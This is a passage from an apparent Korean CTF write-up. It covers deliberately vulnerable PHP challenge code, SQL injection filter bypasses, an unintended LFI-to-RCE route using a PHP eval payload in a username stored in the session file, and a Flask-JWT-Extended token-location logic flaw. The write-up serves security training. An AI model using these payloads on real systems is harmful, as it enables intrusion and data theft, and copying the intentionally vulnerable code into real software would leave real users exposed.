		  <span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>
		
			<span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">)){</span>
					<span class="k">echo</span> <span class="s2">"&lt;li onclick=</span><span class="se">\"</span><span class="s2">location.href='/?page=view&amp;id=${row['id']}';</span><span class="se">\"</span><span class="s2">&gt;"</span><span class="p">;</span>
					<span class="k">echo</span> <span class="s2">"&lt;img src=</span><span class="se">\"</span><span class="s2">${row['img']}</span><span class="se">\"</span><span class="s2"> style=</span><span class="se">\"</span><span class="s2">width: 100%; height: 20vh; object-fit: cover; </span><span class="se">\"</span><span class="s2">&gt;"</span><span class="p">;</span>
					<span class="k">echo</span> <span class="s1">'&lt;div class="post-info"&gt;'</span><span class="p">;</span>
					<span class="k">echo</span> <span class="s1">'&lt;div class="post-basic-info"&gt;'</span><span class="p">;</span>
					<span class="k">echo</span> <span class="s2">"&lt;h3&gt;&lt;a href=</span><span class="se">\"</span><span class="s2">#</span><span class="se">\"</span><span class="s2">&gt;${row['title']}&lt;/a&gt;&lt;/h3&gt;"</span><span class="p">;</span>
			              <span class="k">echo</span> <span class="s2">"&lt;p&gt;${row['content']}&lt;/p&gt;"</span><span class="p">;</span>
			              <span class="k">echo</span> <span class="s2">"&lt;span&gt;&lt;a href=</span><span class="se">\"</span><span class="s2">#</span><span class="se">\"</span><span class="s2">&gt;Writer: ${row['author']}&lt;/a&gt;&lt;/span&gt;"</span><span class="p">;</span>
					<span class="k">echo</span> <span class="s1">'&lt;/div&gt;'</span><span class="p">;</span>
					<span class="k">echo</span> <span class="s1">'&lt;/div&gt;'</span><span class="p">;</span>
					<span class="k">echo</span> <span class="s1">'&lt;/li&gt;'</span><span class="p">;</span>
		  <span class="p">}</span>
<span class="cp">?&gt;</span>

<span class="c">&lt;!-- ... --&gt;</span>
</code></pre></div></div>

<ul>
  <li>
<code class="highlighter-rouge">articles.php</code> 의 코드를 확인해보면 검색 구문에서 <code class="highlighter-rouge">sql injection</code> 취약점이 발생한다는 것을 알 수 있다.</li>
  <li>하지만 상단의 정규표현식에서 어느 정도의 공백과 <code class="highlighter-rouge">=</code>, <code class="highlighter-rouge">like</code> 등을 필터링 하고 있기 때문에 이를 적절히 우회하여 필요한 정보를 얻어내야 한다.</li>
</ul>

<p><img src="/assets/bob/bob933.png" alt="/assets/bob/bob933.png"></p>

<ul>
  <li>공백이 필터링 되었으니 <code class="highlighter-rouge">\x0b</code> 또는 <code class="highlighter-rouge">/**/</code> 등의 주석을 이용하여 공백을 대체하고, <code class="highlighter-rouge">like</code> 와 <code class="highlighter-rouge">=</code> 가 필터링 되었으니 <code class="highlighter-rouge">in</code> 을 사용하여 비교를 해주자.</li>
  <li>
<code class="highlighter-rouge">sql injection</code>을 통해 해당 데이터베이스 내의 테이블 리스트를 추출하였으며, 그 중 <code class="highlighter-rouge">p4SSc0D3</code> 테이블이 존재하는 것을 확인할 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob934.png" alt="/assets/bob/bob934.png"></p>

<ul>
  <li>
<code class="highlighter-rouge">p4SSc0D3</code> 테이블의 컬럼명은 <code class="highlighter-rouge">passcode</code>인 것을 확인할 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob935.png" alt="/assets/bob/bob935.png"></p>

<h3 id="6-flag-확인">6. flag 확인</h3>

<ul>
  <li>
<code class="highlighter-rouge">passcode</code>는 <code class="highlighter-rouge">5UP3R_S3CUR3_STR0NG_P4S5C0D3</code> 인 것을 확인했으니, 이전에 확인한 웹 서비스(개)에 <code class="highlighter-rouge">passcode</code>를 입력하면 <code class="highlighter-rouge">flag</code>를 얻을 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob936.png" alt="/assets/bob/bob936.png"></p>

<ul>
  <li>FLAG : bob{sabeon_eun_gaein_juiya}</li>
</ul>

<h3 id="7-여담-1">7. 여담 (1)</h3>

<p><img src="/assets/bob/bob937.png" alt="/assets/bob/bob937.png"></p>

<ul>
  <li>
<code class="highlighter-rouge">sql injection</code>을 통해 <code class="highlighter-rouge">admin</code> 테이블과 <code class="highlighter-rouge">clue</code> 테이블이 있는 것을 확인할 수 있다.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// ...</span>

<span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/(\ |</span><span class="se">\n</span><span class="s2">|</span><span class="se">\t</span><span class="s2">|</span><span class="se">\r</span><span class="s2">|@|insert|update|delete|=|like|admin|substr|concat|-|ascii|`|load|into|clue|text</span><span class="se">\"</span><span class="s2">)/i"</span><span class="p">,</span> <span class="nv">$search</span><span class="p">)</span> <span class="o">===</span> <span class="mi">1</span><span class="p">){</span>
    <span class="k">echo</span> <span class="s2">"&lt;script&gt;alert('Don\'t hack!');history.back();&lt;/script&gt;"</span><span class="p">;</span>
    <span class="k">die</span><span class="p">();</span>
<span class="p">}</span>

<span class="c1">// ...</span>
</code></pre></div></div>

<ul>
  <li>하지만 대회 서비스 중 <code class="highlighter-rouge">articles.php</code> 의 필터링으로 인해 <code class="highlighter-rouge">clue</code> 와 <code class="highlighter-rouge">admin</code> 모두 접근이 불가능한 상태였다.</li>
  <li>
<code class="highlighter-rouge">admin</code> 테이블은 <code class="highlighter-rouge">admin 계정</code> 의 평문 패스워드를 저장해두었다.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- ... --&gt;</span>

<span class="cp">&lt;?php</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]){</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]</span> <span class="o">===</span> <span class="s2">"admin"</span><span class="p">){</span>
            <span class="k">echo</span> <span class="s2">"&lt;li&gt;&lt;a href=</span><span class="se">\"</span><span class="s2">/?page=readme</span><span class="se">\"</span><span class="s2">&gt;&lt;span&gt;Readme&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;"</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">echo</span> <span class="s2">"&lt;li style=</span><span class="se">\"</span><span class="s2">position: absolute; left: 10rem;</span><span class="se">\"</span><span class="s2">&gt;&lt;a href=</span><span class="se">\"</span><span class="s2">#</span><span class="se">\"</span><span class="s2"> style=</span><span class="se">\"</span><span class="s2">cursor: default;</span><span class="se">\"</span><span class="s2">&gt;&lt;span&gt;USER : ${_SESSION['username']}&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;"</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s1">'&lt;li style="position: absolute; right: 10rem;"&gt;&lt;a href="/?page=mypage"&gt;&lt;span&gt;Mypage&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;'</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s1">'&lt;li style="position: absolute; right: 3rem;"&gt;&lt;a href="/?page=logout"&gt;&lt;span&gt;Logout&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;'</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span><span class="p">{</span>
        <span class="k">echo</span> <span class="s1">'&lt;li style="position: absolute; right: 3rem;"&gt;&lt;a href="/?page=login"&gt;&lt;span&gt;Login&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;'</span><span class="p">;</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>

<span class="c">&lt;!-- ... --&gt;</span>
</code></pre></div></div>

<ul>
  <li>그리고 <code class="highlighter-rouge">admin 계정</code> 으로 로그인하면 <code class="highlighter-rouge">readme.php</code> 페이지에 접근할 수 있는 메뉴가 생긴다.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- ... --&gt;</span>

<span class="cp">&lt;?php</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]</span> <span class="o">!==</span> <span class="s2">"admin"</span><span class="p">){</span>
        <span class="k">echo</span> <span class="s1">'&lt;script&gt;alert("Invalid access.");history.back();&lt;/script&gt;'</span><span class="p">;</span>
        <span class="k">die</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$sql</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"select text from clue where 1 limit 1"</span><span class="p">);</span>
    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>

    <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">get_result</span><span class="p">();</span>
    <span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">fetch_assoc</span><span class="p">();</span>
    
    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s2">"text"</span><span class="p">]);</span>

    
    <span class="k">echo</span> <span class="nv">$data</span><span class="p">;</span>
<span class="cp">?&gt;</span>

<span class="c">&lt;!-- ... --&gt;</span>
</code></pre></div></div>

<ul>
  <li>
<code class="highlighter-rouge">readme.php</code> 페이지는 <code class="highlighter-rouge">clue</code> 테이블에 존재하는 힌트 메시지를 받아와 출력해주는 역할을 한다.</li>
</ul>

<p><img src="/assets/bob/bob938.png" alt="/assets/bob/bob938.png"></p>

<ul>
  <li>대회 전 날, 잠결에 코드 수정하다 <code class="highlighter-rouge">admin</code> 문자열을 필터링에 넣는 바람에,, <code class="highlighter-rouge">admin 계정</code> 의 패스워드를 알아내지 못하게 되어 힌트 페이지가 사라지게 되었다.</li>
  <li>이를 인지했을 땐 이미 solver가 나왔기 때문에 수정할 수 없어 힌트 페이지는 없었던 것으로,,, 되었다.</li>
  <li>위 스크린샷이 이제는 들어갈 수 없어져버린 <code class="highlighter-rouge">힌트 페이지</code> 다.</li>
</ul>

<h3 id="8-여담-2--unintended-solution">8. 여담 (2) → Unintended Solution</h3>

<ul>
  <li>
<code class="highlighter-rouge">이진*</code>, <code class="highlighter-rouge">김경*</code> 님께서 위에 설명했던 <code class="highlighter-rouge">/home/php/.bash_history</code> 참조를 통한 풀이가 아닌 <code class="highlighter-rouge">rce</code> 로 문제를 풀이하여, 이에 대한 설명도 진행하겠다.</li>
  <li>lfi와 sqli의 과정은 동일하다.</li>
</ul>

<p><img src="/assets/bob/bob939.png" alt="/assets/bob/bob939.png"></p>

<ul>
  <li>헤더 메뉴를 확인해보면, 로그인 시 <code class="highlighter-rouge">USER : {USERNAME}</code> 의 형태로 출력되는 것을 확인할 수 있다.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- ... --&gt;</span>

<span class="cp">&lt;?php</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]){</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]</span> <span class="o">===</span> <span class="s2">"admin"</span><span class="p">){</span>
            <span class="k">echo</span> <span class="s2">"&lt;li&gt;&lt;a href=</span><span class="se">\"</span><span class="s2">/?page=readme</span><span class="se">\"</span><span class="s2">&gt;&lt;span&gt;Readme&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;"</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">echo</span> <span class="s2">"&lt;li style=</span><span class="se">\"</span><span class="s2">position: absolute; left: 10rem;</span><span class="se">\"</span><span class="s2">&gt;&lt;a href=</span><span class="se">\"</span><span class="s2">#</span><span class="se">\"</span><span class="s2"> style=</span><span class="se">\"</span><span class="s2">cursor: default;</span><span class="se">\"</span><span class="s2">&gt;&lt;span&gt;USER : ${_SESSION['username']}&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;"</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s1">'&lt;li style="position: absolute; right: 10rem;"&gt;&lt;a href="/?page=mypage"&gt;&lt;span&gt;Mypage&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;'</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s1">'&lt;li style="position: absolute; right: 3rem;"&gt;&lt;a href="/?page=logout"&gt;&lt;span&gt;Logout&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;'</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span><span class="p">{</span>
        <span class="k">echo</span> <span class="s1">'&lt;li style="position: absolute; right: 3rem;"&gt;&lt;a href="/?page=login"&gt;&lt;span&gt;Login&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;'</span><span class="p">;</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>

<span class="c">&lt;!-- ... --&gt;</span>
</code></pre></div></div>

<ul>
  <li>
<code class="highlighter-rouge">header.php</code> 를 확인해보면 <code class="highlighter-rouge">$_SESSION['username']</code> 으로 세션에 저장된 username을 가져온다.</li>
  <li>username에 <code class="highlighter-rouge"><span class="cp">&lt;?=</span><span class="nx">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="err">[</span><span class="mi">0</span><span class="err">]</span><span class="p">)</span><span class="cp">?&gt;</span></code> 와 같은 PHP expression tag를 사용하여 eval 코드를 삽입한 후 회원가입 및 로그인한다.</li>
  <li>이후 일반적으로 세션이 저장되는 위치인 <code class="highlighter-rouge">/var/lib/php/session/</code> 디렉토리의 <code class="highlighter-rouge">sess_{PHPSESSID}</code> 파일을 lfi 취약점을 통해 include하여 <code class="highlighter-rouge">rce</code> 한다.</li>
</ul>

<p><img src="/assets/bob/bob940.png" alt="/assets/bob/bob940.png"></p>

<p><img src="/assets/bob/bob941.png" alt="/assets/bob/bob941.png"></p>

<p><img src="/assets/bob/bob942.png" alt="/assets/bob/bob942.png"></p>

<ul>
  <li>위와 같이 <code class="highlighter-rouge">rce</code> 를 진행한 후, python flask 소스코드가 있는 <code class="highlighter-rouge">/app</code> 디렉토리를 찾아 해당 <code class="highlighter-rouge">/app/app.py</code> 를 읽어 포트 번호를 알아낸다.</li>
  <li>
    <p>그리고 <code class="highlighter-rouge">curl 명령어</code> 또는 <code class="highlighter-rouge">ssrf 취약점</code> 을 이용하여 <code class="highlighter-rouge">http://localhost:2026/flag</code> 페이지에 접근하여 플래그를 획득한다.</p>
  </li>
  <li>php 계정은 <code class="highlighter-rouge">/flag</code> 파일에 대한 읽기 권한이 없기 때문에 <code class="highlighter-rouge">cat /flag</code>  또는 <code class="highlighter-rouge">lfi 취약점</code> 으로는 읽을 수 없다.</li>
</ul>

<p><br></p>

<p><br></p>

<h2 id="jwt-extended">
<a class="anchor" href="#jwt-extended" aria-hidden="true"><span class="octicon octicon-link"></span></a>JWT-Extended</h2>

<hr>

<p><img src="/assets/bob/bob943.png" alt="/assets/bob/bob943.png"></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>안전하지 않은 Flask-JWT-Extended 모듈 사용

- JWT 토큰을 전송하는 방법을 여러 가지로 시도해볼 수 있다.
- 문제에서 /flag로 아무런 값을 넣지 않고 접근해보면 다음과 같은 msg를 받을 수 있다. 여기서 cookies or headers 라는 문구를 통해 토큰 값을 적절히 넣어줄 곳을 예상할 수 있다.
</code></pre></div></div>

<p><img src="/assets/bob/bob944.png" alt="/assets/bob/bob944.png"></p>

<ul>
  <li>Cookie와 Header를 번갈아가며 만료되거나 만료되지 않은 값을 삽입한 후 전송하게 되면 풀리는 문제다.</li>
</ul>

<h3 id="문제-상세-설명">문제 상세 설명</h3>

<ul>
  <li>원래의 문제 소스는 아래와 같다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="p">(</span>
    <span class="n">Flask</span><span class="p">,</span>
    <span class="n">request</span><span class="p">,</span>
    <span class="n">jsonify</span>
<span class="p">)</span>
<span class="kn">from</span> <span class="nn">flask_jwt_extended</span> <span class="kn">import</span> <span class="p">(</span>
    <span class="n">JWTManager</span><span class="p">,</span>
    <span class="n">jwt_required</span><span class="p">,</span>
    <span class="n">create_access_token</span><span class="p">,</span>
    <span class="n">decode_token</span><span class="p">,</span>
    <span class="n">get_jwt_identity</span><span class="p">,</span>
<span class="p">)</span>

<span class="kn">from</span> <span class="nn">jwt.utils</span>      <span class="kn">import</span> <span class="n">base64url_decode</span>
<span class="kn">from</span> <span class="nn">jwt.algorithms</span> <span class="kn">import</span> <span class="n">get_default_algorithms</span>

<span class="kn">import</span> <span class="nn">datetime</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">json</span>
 

<span class="k">def</span> <span class="nf">is_expired</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">decode_token</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">allow_expired</span><span class="o">=</span><span class="bp">True</span><span class="p">)[</span><span class="s">'exp'</span><span class="p">]</span> <span class="o">&lt;</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="p">.</span><span class="n">time</span><span class="p">()):</span>
        <span class="k">return</span> <span class="bp">True</span>   
    
    <span class="k">return</span> <span class="bp">False</span>

<span class="k">def</span> <span class="nf">create_app</span><span class="p">(</span><span class="n">config</span><span class="o">=</span><span class="s">"app.config.Config"</span><span class="p">):</span>
    <span class="c1"># Setup flask
</span>    <span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>

    <span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">.</span><span class="n">from_object</span><span class="p">(</span><span class="n">config</span><span class="p">)</span>

    <span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/"</span><span class="p">)</span>
    <span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
        <span class="k">return</span> <span class="s">"POST : /login &lt;br&gt;</span><span class="se">\n</span><span class="s">GET : /flag"</span>
    
    <span class="c1"># Standard login endpoint
</span>    <span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/login'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'POST'</span><span class="p">])</span>
    <span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'username'</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
            <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'password'</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"msg"</span><span class="p">:</span><span class="s">"""Bad request. Submit your login / pass as {"username":"admin","password":"admin"}"""</span><span class="p">}),</span> <span class="mi">400</span>
    
        <span class="k">if</span> <span class="n">username</span> <span class="o">!=</span> <span class="s">'admin'</span> <span class="ow">or</span> <span class="n">password</span> <span class="o">!=</span> <span class="s">'admin'</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"msg"</span><span class="p">:</span> <span class="s">"Bad username or password"</span><span class="p">}),</span> <span class="mi">401</span>
    
        <span class="n">access_token</span> <span class="o">=</span> <span class="n">create_access_token</span><span class="p">(</span> <span class="n">identity</span><span class="o">=</span><span class="n">username</span><span class="p">,</span>
                                            <span class="n">expires_delta</span><span class="o">=</span><span class="n">datetime</span><span class="p">.</span><span class="n">timedelta</span><span class="p">(</span><span class="n">minutes</span><span class="o">=</span><span class="mi">1</span><span class="p">))</span>

        <span class="n">ret</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s">'access_token'</span><span class="p">:</span> <span class="n">access_token</span><span class="p">,</span>
        <span class="p">}</span>
    
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">ret</span><span class="p">),</span> <span class="mi">200</span>
    
    <span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/flag'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">])</span>
    <span class="o">@</span><span class="n">jwt_required</span>
    <span class="k">def</span> <span class="nf">flag</span><span class="p">():</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">access_token</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"Authorization"</span><span class="p">).</span><span class="n">split</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"msg"</span>           <span class="p">:</span> <span class="s">"No Token!"</span><span class="p">})</span>

        <span class="n">current_user</span> <span class="o">=</span> <span class="n">get_jwt_identity</span><span class="p">()</span>
        
        <span class="k">if</span> <span class="n">current_user</span> <span class="o">==</span> <span class="s">'admin'</span> <span class="ow">and</span> <span class="n">is_expired</span><span class="p">(</span><span class="n">access_token</span><span class="p">):</span>
            <span class="c1"># Here your Flag / It is not Race condition
</span>            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"Good For You"</span>  <span class="p">:</span> <span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'FLAG'</span><span class="p">]})</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"msg"</span>           <span class="p">:</span><span class="s">"Not Expired Token!"</span><span class="p">})</span>
    

    <span class="k">with</span> <span class="n">app</span><span class="p">.</span><span class="n">app_context</span><span class="p">():</span>
        <span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'JWT_SECRET_KEY'</span><span class="p">]</span>     <span class="o">=</span> <span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'SECRET'</span><span class="p">]</span>
        <span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'JWT_TOKEN_LOCATION'</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="s">'cookies'</span><span class="p">,</span> <span class="s">'headers'</span><span class="p">]</span>
        <span class="n">jwtmanager</span>                       <span class="o">=</span> <span class="n">JWTManager</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">app</span>
</code></pre></div></div>

<ul>
  <li>위의 문제에서 요구하는 것은 /flag 로 접근하여 <strong><code class="highlighter-rouge">@jwt_required</code></strong>를 통과한 후, flag 함수를 실행하지만, <strong><code class="highlighter-rouge">get_jwt_identity()</code></strong> 함수와 <strong><code class="highlighter-rouge">is_expired()</code></strong> 함수를 통해 현재 토큰이 만료되어야만 flag를 전달해주는 형태의 문제이다.</li>
  <li>첫 번째로 jwt_required라는 decorator에서는 request에서 받아온 JWT의 상태를 체크하고, 정상적인 토큰(만료 상태, 시그니처 확인 등)인 가를 확인한다. 즉, 정상적으로 서버에서 발행한 토큰이어야 한다는 의미이다.</li>
  <li>두 번째로 access_token에서 Authorization 헤더에 있는 토큰을 받아와 해당 토큰이 정상적인지 체크하여 expired 되었는지 확인하는 루틴이 있다. 단, 여기서도 get_jwt_identity() 함수로 토큰을 검사하기 때문에 서버에서 발행한 정상적인 토큰을 사용해야 한다.</li>
  <li>따라서 위의 문제의 컨셉은 <strong>JWT가 만료되지 않았지만, 만료되어야 풀리</strong>는 문제로, 로지컬한 취약점을 의도한 것이다. 먼저 문제 풀이에 앞서 Flask-JWT-Extended 오픈소스에 대한 설명이 필요할 것 같다.</li>
</ul>

<h3 id="flask-jwt-extended">Flask-JWT-Extended</h3>

<ul>
  <li>Flask에는 다양한 Extended 모듈이 있는데, 그 중 하나로 JWT에 대한 모듈이 있다. pyjwt를 사용해도 무방하나, 보다 유연한 코드 작성과 관리를 위해 Flask-JWT-Extended를 추천한다.</li>
  <li>
<a href="https://flask-jwt-extended.readthedocs.io/en/stable/"><strong>Document</strong></a>를 살펴보면 Basic Usage에서 보여주는 것과 같이 <strong><code class="highlighter-rouge">Header</code></strong>를 통해 JWT를 사용하는 것과 <strong><code class="highlighter-rouge">Query(get)</code></strong>, <strong><code class="highlighter-rouge">JSON(post)</code></strong>, <strong><code class="highlighter-rouge">Cookie</code></strong>그리고 총 네 가지 방법으로 사용이 가능하다.</li>
  <li>이를 처리하는 루틴을 먼저 파악해보도록 하자.</li>
  <li>flask-jwt-extended 의 view_decorator 소스</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># https://github.com/vimalloc/flask-jwt-extended/blob/master/flask_jwt_extended/view_decorators.py
</span><span class="k">def</span> <span class="nf">_decode_jwt_from_request</span><span class="p">(</span><span class="n">request_type</span><span class="p">):</span>
    <span class="c1"># All the places we can get a JWT from in this request
</span>    <span class="n">get_encoded_token_functions</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="n">locations</span> <span class="o">=</span> <span class="n">config</span><span class="p">.</span><span class="n">token_location</span>

    <span class="c1"># add the functions in the order specified in JWT_TOKEN_LOCATION
</span>    <span class="k">for</span> <span class="n">location</span> <span class="ow">in</span> <span class="n">locations</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">location</span> <span class="o">==</span> <span class="s">'cookies'</span><span class="p">:</span>
            <span class="n">get_encoded_token_functions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span>
                <span class="k">lambda</span><span class="p">:</span> <span class="n">_decode_jwt_from_cookies</span><span class="p">(</span><span class="n">request_type</span><span class="p">))</span>
        <span class="k">if</span> <span class="n">location</span> <span class="o">==</span> <span class="s">'query_string'</span><span class="p">:</span>
            <span class="n">get_encoded_token_functions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">_decode_jwt_from_query_string</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">location</span> <span class="o">==</span> <span class="s">'headers'</span><span class="p">:</span>
            <span class="n">get_encoded_token_functions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">_decode_jwt_from_headers</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">location</span> <span class="o">==</span> <span class="s">'json'</span><span class="p">:</span>
            <span class="n">get_encoded_token_functions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span>
                <span class="k">lambda</span><span class="p">:</span> <span class="n">_decode_jwt_from_json</span><span class="p">(</span><span class="n">request_type</span><span class="p">))</span>

    <span class="c1"># Try to find the token from one of these locations. It only needs to exist
</span>    <span class="c1"># in one place to be valid (not every location).
</span>    <span class="n">errors</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">decoded_token</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="n">jwt_header</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">for</span> <span class="n">get_encoded_token_function</span> <span class="ow">in</span> <span class="n">get_encoded_token_functions</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">encoded_token</span><span class="p">,</span> <span class="n">csrf_token</span> <span class="o">=</span> <span class="n">get_encoded_token_function</span><span class="p">()</span>
            <span class="n">decoded_token</span> <span class="o">=</span> <span class="n">decode_token</span><span class="p">(</span><span class="n">encoded_token</span><span class="p">,</span> <span class="n">csrf_token</span><span class="p">)</span>
            <span class="n">jwt_header</span> <span class="o">=</span> <span class="n">get_unverified_jwt_headers</span><span class="p">(</span><span class="n">encoded_token</span><span class="p">)</span>
            <span class="k">break</span>
        <span class="k">except</span> <span class="n">NoAuthorizationError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="n">errors</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>

    <span class="c1"># Do some work to make a helpful and human readable error message if no
</span>    <span class="c1"># token was found in any of the expected locations.
</span>    <span class="k">if</span> <span class="ow">not</span> <span class="n">decoded_token</span><span class="p">:</span>
        <span class="n">token_locations</span> <span class="o">=</span> <span class="n">config</span><span class="p">.</span><span class="n">token_location</span>
        <span class="n">multiple_jwt_locations</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">token_locations</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span>

        <span class="k">if</span> <span class="n">multiple_jwt_locations</span><span class="p">:</span>
            <span class="n">err_msg</span> <span class="o">=</span> <span class="s">"Missing JWT in {start_locs} or {end_locs} ({details})"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span>
                <span class="n">start_locs</span><span class="o">=</span><span class="s">", "</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">token_locations</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]),</span>
                <span class="n">end_locs</span><span class="o">=</span><span class="n">token_locations</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span>
                <span class="n">details</span><span class="o">=</span><span class="s">"; "</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">errors</span><span class="p">)</span>
